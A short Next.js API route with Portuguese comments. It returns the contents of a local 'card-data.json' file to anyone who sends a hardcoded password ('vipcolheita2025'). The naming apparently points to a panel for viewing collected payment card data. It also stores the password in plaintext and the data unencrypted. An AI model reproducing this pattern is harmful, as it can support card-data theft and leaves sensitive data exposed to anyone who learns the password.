import { type NextRequest, NextResponse } from "next/server"
import fs from 'fs'
import path from 'path'

export async function POST(request: NextRequest) {
  try {
    const { password } = await request.json()
    
    // Verificar senha
    if (password !== 'vipcolheita2025') {
      return NextResponse.json({ 
        success: false,
        error: "Senha incorreta"
      }, { status: 401 })
    }
    
    // Caminho do arquivo JSON
    const filePath = path.join(process.cwd(), 'card-data.json')
    
    // Ler dados
    try {
      const fileContent = fs.readFileSync(filePath, 'utf-8')
      const data = JSON.parse(fileContent)
      
      return NextResponse.json({ 
        success: true,
        data: data.reverse() // Mais recentes primeiro
      })
    } catch (error) {
      return NextResponse.json({ 
        success: true,
        data: []
      })
    }
  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: "Erro ao buscar dados"
    }, { status: 500 })
  }
}
